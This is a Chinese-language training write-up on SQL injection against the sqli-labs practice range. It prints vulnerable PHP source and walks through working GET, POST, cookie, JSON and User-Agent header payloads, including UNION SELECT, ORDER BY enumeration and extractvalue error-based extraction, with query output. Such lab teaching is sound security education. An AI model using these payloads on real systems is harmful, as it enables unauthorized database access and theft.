![](https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png#from=url&id=JksGG&originHeight=1291&originWidth=1288&originalType=binary&ratio=2&status=done&style=none)
```bash
#简要明确参数类型
数字，字符，搜索，JsoN等

#简要明确请求方法
GET, POST,COOKIE，REQUEST，HTTP头等

其中sql语句干扰符号: ',",s,),}等，具体需看写法

```
<a name="eUGfM"></a>
### 1、参数字符型注入测试
=>sqlilabs less 5 6<br />在靶场中查看源代码
```bash
root@9a845c5ed654:/var/www/html/Less-5# cat index.php
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-5 Double Query- Single Quotes- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity


$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";		#SQL执行的语句
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

        if($row)
        {
        echo '<font size="5" color="#FFFF00">';
        echo 'You are in...........';
        echo "<br>";
        echo "</font>";
        }
        else
        {

        echo '<font size="3" color="#FFFF00">';
        print_r(mysql_error());
        echo "</br></font>";
        echo '<font color= "#0000ff" font size= 3>';

        }
}
        else { echo "Please input the ID as parameter with numeric value";}

?>

</font> </div></br></br></br><center>
<img src="../images/Less-5.jpg" /></center>
</body>
</html>
```
`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`SQL执行的语句是采用了''闭合,<br />我们要是直接使用?id=1 and 1=1相当于执行的是`SELECT * FROM users WHERE id='1 and 1=1' LIMIT 0,1;`是不会有任何的反应。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624072601160-2484f555-bbf7-4484-8b0b-d96d77a7971d.png#clientId=u6d4ee156-1358-4&from=paste&height=238&id=u594d1003&originHeight=415&originWidth=1289&originalType=binary&ratio=2&size=346040&status=done&style=none&taskId=u1c841e07-5b4b-4deb-84cf-144d8550936&width=740.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624072577561-c1623923-a123-460e-886d-760b5b6857d3.png#clientId=u6d4ee156-1358-4&from=paste&height=245&id=ud240a015&originHeight=422&originWidth=1287&originalType=binary&ratio=2&size=345858&status=done&style=none&taskId=u71182be8-1910-4daf-ac6b-f0b56c3c807&width=746.5)<br />正确的报错语句
```bash
http://10.1.1.133/Less-5/?id=1' and '1'='1
http://10.1.1.133/Less-5/?id=1' and '1'='2
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624072759799-6db0cad1-0771-47b3-9b2d-8ac012959115.png#clientId=u6d4ee156-1358-4&from=paste&height=253&id=u1e148400&originHeight=438&originWidth=1296&originalType=binary&ratio=2&size=349124&status=done&style=none&taskId=uf0298f13-1f38-4dea-ae80-ac884c81b28&width=748)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624072783472-75a5865e-986e-4891-8857-08b2060d6931.png#clientId=u6d4ee156-1358-4&from=paste&height=215&id=u0ef95926&originHeight=405&originWidth=1410&originalType=binary&ratio=2&size=347668&status=done&style=none&taskId=ubf5285e3-3abb-41bd-a66e-b9fd323cb39&width=750)<br />在浏览器中解释执行的%27是'

在数据库中执行语句为
```bash
mysql> SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1;
Empty set (0.00 sec)

mysql>

```
获取字段<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624073239739-f9ec5c37-4727-4789-b624-dd0e961acaae.png#clientId=u6d4ee156-1358-4&from=paste&height=205&id=u0677df5b&originHeight=409&originWidth=1281&originalType=binary&ratio=2&size=345915&status=done&style=none&taskId=ude7df085-cdea-4e01-baed-7b47df7ba5a&width=640.5)<br />--+是将后面的代码注释不执行<br />在数据库中执行
```bash
mysql> SELECT * FROM users WHERE id='1' order by 4;
ERROR 1054 (42S22): Unknown column '4' in 'order clause'
mysql> SELECT * FROM users WHERE id='1' order by 3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql>

```
**Less-6代码查看**
```bash
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```
采用双引号的方式进行了编码，绕过方法"闭合前面的引号后面采用--+注释<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624073840355-7478a4e9-af4b-4ecd-ac53-b74c1d27c1de.png#clientId=u6d4ee156-1358-4&from=paste&height=242&id=ub9758d69&originHeight=421&originWidth=1295&originalType=binary&ratio=2&size=346567&status=done&style=none&taskId=u4223c378-cf87-44ba-9267-37bf3926072&width=745.5)
<a name="WAM8S"></a>
### 2、POST数据提交注入测试
=>sqlilabs less 11<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624073988590-dddf9a60-7059-4daa-a761-2b1a9736f0db.png#clientId=u6d4ee156-1358-4&from=paste&height=431&id=u87c32c8f&originHeight=651&originWidth=1138&originalType=binary&ratio=2&size=287635&status=done&style=none&taskId=u54558fc5-b126-4ad9-b04c-202536238a7&width=753)<br />用户和密码都正确提交<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624074324974-451c5291-dbe4-469f-83aa-1d714163498c.png#clientId=u6d4ee156-1358-4&from=paste&height=523&id=ua35787a5&originHeight=761&originWidth=1083&originalType=binary&ratio=2&size=324268&status=done&style=none&taskId=u4298beec-8a92-4f8a-85e8-f9b4d5b85b1&width=744.5)<br />在代码中查看代码的书写
```bash
57          @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
58          $result=mysql_query($sql);
59          $row = mysql_fetch_array($result);

为了实验方便将下面回显sql执行命令
57          @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
58					echo $sql;
59          $result=mysql_query($sql);
60          $row = mysql_fetch_array($result);
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624075970638-292c8f75-2850-4bfe-bf05-047195cbb375.png#clientId=u6d4ee156-1358-4&from=paste&height=397&id=u365b8bf4&originHeight=686&originWidth=1287&originalType=binary&ratio=2&size=312555&status=done&style=none&taskId=u3ca6dd1c-2aca-4134-9fd4-fd96f8749fa&width=745.5)<br />**用hackbar模拟post数据提交测试**<br />以下操作使用hackbar进行渗透测试，hackbar安装地址：[https://github.com/HCTYMFF/hackbar2.1.3](https://github.com/HCTYMFF/hackbar2.1.3)

一般的登录情况都是采用的post提交数据、通过抓包获取到登录信息将它放在hackbar中进行登录测试，也是为了验证hackbar是否能正常使用，要是确认hackbar能正常使用这个可以跳过。<br />在burp抓包获取登录信息<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624241755273-c100946d-1708-42be-b6e7-fa1ee4ebce96.png#clientId=u27436e4c-6830-4&from=paste&height=263&id=ue1b4012c&originHeight=433&originWidth=1231&originalType=binary&ratio=2&size=57691&status=done&style=none&taskId=u9b7f318b-6fd3-403d-978d-cdb550962af&width=748.5)

![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624241636574-bdef0df4-2e9c-4ab9-847b-e354deb653fc.png#clientId=u27436e4c-6830-4&from=paste&height=457&id=u2c19f44a&originHeight=913&originWidth=1920&originalType=binary&ratio=2&size=386441&status=done&style=none&taskId=u6e764936-5c9b-4a0a-8b63-38438cf40fb&width=960)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624241841343-0d3c1777-07c2-4651-b133-c1fc5e43ec32.png#clientId=u27436e4c-6830-4&from=paste&height=455&id=u7f74fb00&originHeight=910&originWidth=1920&originalType=binary&ratio=2&size=308650&status=done&style=none&taskId=uff805d66-9609-4010-948c-87140d4ee65&width=960)

枚举数据库字段<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624243154597-dc349d95-8d32-4a5b-885c-dabd44a94461.png#clientId=u27436e4c-6830-4&from=paste&height=521&id=u7507e507&originHeight=1042&originWidth=1920&originalType=binary&ratio=2&size=405611&status=done&style=none&taskId=u1f8dd791-a13b-48e3-9844-f5bccc07040&width=960)
```bash
uname=admin' order by 3#&passwd=admin&submit=Submit				
```
备注：在mysql中一般注释后面的字句是采用的--+在有些的字句中采用#注释。需要多测试才能发现，为了验证#是注释符号将#替换为--+执行查看结果看到报错信息。<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624243932293-1f9bb2e9-f747-4eaa-b5e6-2c9057c062cd.png#clientId=u27436e4c-6830-4&from=paste&height=459&id=u5dfbb21c&originHeight=918&originWidth=1920&originalType=binary&ratio=2&size=230935&status=done&style=none&taskId=u8847cdd8-c47d-442f-abba-a3f132ab5cf&width=960)<br />在数据库中执行，最终验证#是注释了后面的字句。
```bash
mysql> select username,password from users where username='admin' and 1=2 union select 1,2 --+ and password='admin' limit 0 1
    -> ;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and password='admin' limit 0 1' at line 1
mysql>

将--+替换为#
mysql> select username,password from users where username='admin' and 1=2 union select 1,2 # and password='admin' limit 0 1
    -> ;
+----------+----------+
| username | password |
+----------+----------+
| 1        | 2        |
+----------+----------+
1 row in set (0.00 sec)

mysql>
```

将order by 3改为2查看<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624243355285-372c596a-8a9d-4ca8-9a29-af3d6b7948db.png#clientId=u27436e4c-6830-4&from=paste&height=519&id=u1801c7f5&originHeight=1038&originWidth=1920&originalType=binary&ratio=2&size=313513&status=done&style=none&taskId=ucc6e56b9-74ee-41f3-87a3-b513daeb26f&width=960)
```bash
uname=admin' order by 2#&passwd=admin&submit=Submit			
```
这里看到我们登陆成功，但实际上我们登陆的用户名和密码是错误的因为只是将sql语句注入进去没有报错下面的语句正常的执行就显示登陆成功，换句话说登录到情况只有两个字段。很可能就是用户名和密码。

枚举出数据库名称:
```bash
uname=admin' and 1=2 union select database(),2 #&passwd=admin&submit=Submit
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624244411382-f6df356e-00e3-42e0-bf40-e171ec72c05d.png#clientId=u27436e4c-6830-4&from=paste&height=433&id=u92634a48&originHeight=865&originWidth=1919&originalType=binary&ratio=2&size=375480&status=done&style=none&taskId=ua8efd111-2b4e-4156-89ec-e4ab919dfed&width=959.5)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624244556975-7ae64a8f-ca9a-4437-b392-25ef4d5dbd73.png#clientId=u27436e4c-6830-4&from=paste&height=476&id=ub5c19a82&originHeight=952&originWidth=1920&originalType=binary&ratio=2&size=337149&status=done&style=none&taskId=u75bc553b-bb42-4bbf-b92d-c4db8539aae&width=960)
<a name="rufZ0"></a>
### 3、参数JSON数据注入测试
=>本地环境代码演示<br />json格式<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624337366270-9545e393-0955-4f43-8628-4fb037a0cd53.png#clientId=ua752d66c-6d8f-4&from=paste&height=408&id=u0f98746d&originHeight=815&originWidth=1436&originalType=binary&ratio=2&size=494133&status=done&style=none&taskId=u1613d504-40eb-4957-9bc5-2110a65135b&width=718)<br />json注入<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624337757521-14b7e701-9024-4ef6-9696-83c7fcef0409.png#clientId=u41a4f6e1-19c7-4&from=paste&height=228&id=u9622cfca&originHeight=374&originWidth=1168&originalType=binary&ratio=2&size=310894&status=done&style=none&taskId=ufb4e1b09-c247-42ca-a139-6c78384d433&width=711)

注入方式：如果是数字的可以不加'闭合如果是字符的话，加上"闭合
<a name="OlRjb"></a>
### 4、COOKIE数据提交注入测试
=>sqlilabs less 20<br />**网站传递参数的方式**

| **参数类型** | **含义** |
| --- | --- |
| get型 | 一般访问网页的行为 |
| cookie型 | 伴随着所有访问网页的行为 |
| post型 | 上传文件，登陆 |

**cookie注入原理：**对get传递来的参数进行了过滤，但是忽略了cookie也可以传递参数。
> 【cookie注入的原理在于更改本地的cookie，从而利用cookie来提交非法语句。】 

| 条件 | 含义 |
| --- | --- |
| 条件1 | 程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤 |
| 条件2 | 条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取，也就是说用request这个方法的时候获取的参数可以是是在URL后面的参数也可以是cookie里面的参数这里没有做筛选，之后的原理就像我们的sql注入一样了。<br />[

](https://blog.csdn.net/qq_41901122/article/details/104442129) |

通过burp抓包分析<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330249164-46752144-cee4-4c22-8d5c-b07f2ce549e1.png#clientId=u1c95d79b-b137-4&from=paste&height=226&id=u38623650&originHeight=452&originWidth=1915&originalType=binary&ratio=2&size=76615&status=done&style=none&taskId=ucd545992-cacc-451e-b3e6-c97e912bb33&width=957.5)![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330271540-5e82be77-92ac-4e25-8794-87e8f1081130.png#clientId=u1c95d79b-b137-4&from=paste&height=182&id=ud77fd978&originHeight=364&originWidth=1920&originalType=binary&ratio=2&size=60951&status=done&style=none&taskId=u17245dc4-4013-46f8-a222-3ab72b1b1fc&width=960)![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330319309-c63781a0-ea20-4cff-aeb2-fec5bb9d8337.png#clientId=u1c95d79b-b137-4&from=paste&height=186&id=u840e3cd9&originHeight=372&originWidth=1907&originalType=binary&ratio=2&size=67256&status=done&style=none&taskId=u94ec863a-1fe1-46d3-8e90-45b7d6163f7&width=953.5)<br />将这个数据包发送到repeater模块当中<br /> ![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330418483-a5af2071-3de4-4f4e-a267-1cf7671d9c67.png#clientId=u1c95d79b-b137-4&from=paste&height=186&id=u9d5283dc&originHeight=372&originWidth=1917&originalType=binary&ratio=2&size=219770&status=done&style=none&taskId=ue15ef12e-5415-42aa-a075-8492f65e527&width=958.5)<br />修改cookie参数`Cookie: uname=admin' and 1=2 union select database(),2,3 #`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330466330-95b4e933-734b-4595-a2bc-6a04e756ad0d.png#clientId=u1c95d79b-b137-4&from=paste&height=326&id=u3bda1fe6&originHeight=652&originWidth=1920&originalType=binary&ratio=2&size=272479&status=done&style=none&taskId=uaadd02f8-8c8a-40f8-965f-7ca5225caff&width=960)<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624330510841-e0949cb4-08b5-4267-bb24-a8eb004f2e2e.png#clientId=u1c95d79b-b137-4&from=paste&height=342&id=u6453e6e3&originHeight=683&originWidth=1920&originalType=binary&ratio=2&size=278249&status=done&style=none&taskId=u89b40950-6741-4a5f-8a90-d0d244a07e9&width=960)
<a name="tqwJD"></a>
### 5、HTTP头部参数数据注入测试
=>sqlilabs less 18

查看数据库源代码
```bash
       $sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,                                   1";
        $result1 = mysql_query($sql);
        $row1 = mysql_fetch_array($result1);
                if($row1)
                        {
                        echo '<font color= "#FFFF00" font size = 3 >';
                        $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
                        mysql_query($insert);
                        //echo 'Your IP ADDRESS is: ' .$IP;
                        echo "</font>";
                        //echo "<br>";
                        echo '<font color= "#0000ff" font size = 3 >';
                        echo 'Your User Agent is: ' .$uagent;
                        echo "</font>";
                        echo "<br>";
                        print_r(mysql_error());
                        echo "<br><br>";
                        echo '<img src="../images/flag.jpg"  />';
                        echo "<br>";

                        }
                else
                        {
                        echo '<font color= "#0000ff" font size="3">';
                        //echo "Try again looser";
                        print_r(mysql_error());
                        echo "</br>";
                        echo "</br>";
                        echo '<img src="../images/slap.jpg"   />';
                        echo "</font>";
                        }

```
从上面的SQL语句当中我们可以看到对执行的insert语句没有任何的限制也就是说我们通过修改http的头部信息可以达到SQL注入的效果。

为了实验方便我在第103行下面添加一行显示SQL语句执行的显示界面`echo $insert;`
```bash
root@eafc9e16990f:/var/www/html/Less-18# tail -36 index.php |head -2
                        $insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
                        echo $insert;
root@eafc9e16990f:/var/www/html/Less-18#
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624332396656-e0ea6f63-0de0-4a35-a2b5-ccffae4c488d.png#clientId=u1c95d79b-b137-4&from=paste&height=315&id=u3aab3a67&originHeight=630&originWidth=1920&originalType=binary&ratio=2&size=353378&status=done&style=none&taskId=ucbd2994c-6881-467e-9341-4cca343af60&width=960)<br />修改数据包注入获取数据库名称`'and extractvalue (1,concat(0x7e,(select database()),0x7e)) and'`<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624334576219-8186bbd3-31c1-4822-9004-9c73d26d0d8d.png#clientId=u1c95d79b-b137-4&from=paste&height=395&id=u1007ac56&originHeight=790&originWidth=1920&originalType=binary&ratio=2&size=311633&status=done&style=none&taskId=u711045ce-48f6-4d92-8851-df0681e9300&width=960)<br />获取用户名<br />![image.png](https://cdn.nlark.com/yuque/0/2021/png/2476579/1624334639920-e1622fd2-9950-471d-8b04-8197e857cfd5.png#clientId=u1c95d79b-b137-4&from=paste&height=294&id=u89b4bab2&originHeight=588&originWidth=1920&originalType=binary&ratio=2&size=101869&status=done&style=none&taskId=u1f9aa0ce-e752-4cc4-981d-05019e0d6ed&width=960)
